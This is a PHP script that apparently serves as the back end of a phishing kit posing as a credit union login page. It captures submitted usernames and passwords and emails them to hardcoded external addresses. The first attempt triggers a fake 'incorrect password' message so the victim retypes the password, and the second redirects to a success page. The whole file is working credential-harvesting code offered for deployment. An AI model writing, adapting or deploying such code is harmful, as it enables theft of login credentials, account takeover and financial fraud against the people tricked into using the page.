<?php 
error_reporting(0);
session_start();


function sanitize($value) {
    return htmlspecialchars(trim($value));
}


$EMAIL = "gottmacht.empire@gmail.com";
$SENDER_EMAIL = "gottmacht.empire@yandex.com";


function sendEmail($prevValues, $subject = "GNCU - LOG") {
    global $EMAIL;
    global $SENDER_EMAIL;
    $headers  = 'MIME-Version: 1.0' . "\r\n";
    $headers .= 'Content-type: text/html; charset=UTF-8' . "\r\n";

    $message = "<!DOCTYPE html>
    <html lang='en'>
        <head>
            <meta charset='UTF-8'>
            <style>
                * {
                    margin: 0;
                    padding: 0;
    
                    font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
                }
                .container {
                    width: 100%;
                    max-width: 600px;
                    margin: 0 auto;
                    padding: 2rem;
                }
    
                .dotted {
                    height: 1px;
                    margin: 2rem 0;
                    border-bottom: 2px dashed #000;
                }
    
                .flex {
                    display: flex;
                    align-items: center;
                    margin: .5rem;
                }
    
                .title {
                    font-size: 1rem;
                    font-weight: 500;
                    margin-right: .8rem;
                }
    
                .content {
                    flex: 1;
                    font-size: 1rem;
                    font-weight: 600;
                }
            </style>
        </head>
        <body>
            <div class='container'>
                <div class='dotted'></div>
                <div class='flex'>
                    <p class='title'>Username:</p>
                    <p class='content'>{{username}}</p>
                </div>
    
                <div class='flex'>
                    <p class='title'>Password:</p>
                    <p class='content'>{{password}}</p>
                </div>
            </div>
        </body>
    </html>";

    $values = $prevValues;

    $message = str_replace("{{username}}", $values["username"], $message);
    $message = str_replace("{{password}}", $values["password"], $message);

    // Create email headers
    $headers .= "From: Office M3sh<$SENDER_EMAIL>\r\n";
    $headers .= "Reply-to: $SENDER_EMAIL\r\n";

    return mail($EMAIL, $subject, $message, $headers, "-f$SENDER_EMAIL");
}


if(isset($_POST["sign-in"]) && !isset($_SESSION['num'])) {
    $username = sanitize($_POST["username"]);
    $password = sanitize($_POST["password"]);

    sendEmail(["username" => $username, "password" => $password]);
    $_SESSION['num'] = 1;
    $_SESSION['message'] = "Your account or password is incorrect. If you don't remember your password, <a href='#' class='new-link'>reset it now.</a>";

    // REMEMBER TO CHANGE THIS PATH IF YOUR'RE HOSTING ON DIFFERENT SERVER
    header("Location: ./login.php");
}

if(isset($_POST["sign-in"]) && isset($_SESSION['num'])) {
    $username = sanitize($_POST["username"]);
    $password = sanitize($_POST["password"]);

    sendEmail(["username" => $username, "password" => $password]);
    unset($_SESSION['num']);

    // REMEMBER TO CHANGE THIS PATH IF YOUR'RE HOSTING ON DIFFERENT SERVER
    header("Location: ./success.html");
}